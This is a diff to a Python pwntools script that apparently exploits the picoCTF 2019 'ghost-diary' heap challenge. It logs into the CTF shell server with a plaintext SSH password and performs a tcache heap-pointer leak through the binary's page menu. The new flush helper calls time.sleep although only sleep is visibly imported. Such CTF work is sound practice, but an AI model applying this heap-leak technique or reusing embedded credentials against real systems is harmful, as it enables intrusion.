@@ -4,6 +4,9 @@ from time import sleep
 sh = ssh(host='2019shell1.picoctf.com', user='jamesyoung', password='pBCNtaNiAc7Fs&F')
 server = sh.process('ghostdiary', cwd='/problems/ghost-diary_5_7e39864bc6dc6e66a1ac8f4632e5ffba')
 
+def flush():
+    time.sleep(0.1)
+    return server.recv(4096)
 def new_page(size):
     server.sendline('1')
     if size <= 240:
@@ -14,36 +17,30 @@ def new_page(size):
         print('Invalid size')
         print(0/0)
     server.sendline(str(size))
-    return server.recv(4096)
-    
+    flush()
 def write_page(page, content):
     server.sendline('2')
     server.sendline(str(page))
     server.sendline(content)
-    return server.recv(4096)
-    
+    flush()
 def read_page(page):
     server.sendline('3')
     server.sendline(str(page))
-    return server.recv(4096)
-
+    return flush()
 def burn(page):
     server.sendline('4')
     server.sendline(str(page))
-    return server.recv(4096)
+    flush()
 
 """ HEAP LEAK """
 # Get a chunk to store a tcache linked list pointer ...
-new_page(240)
-new_page(240)
-burn(0)
-burn(1)
+new_page(240); new_page(240)
+burn(0); burn(1)
 # tcache
 for i in range(7): 
     new_page(240)
 # read tcache pointer
 leak = read_page('0').split()
-print(leak)
 leak = leak[leak.index('Content:')+1]
 leak = [hex(ord(c))[2:] for c in leak[::-1]]
 # offset
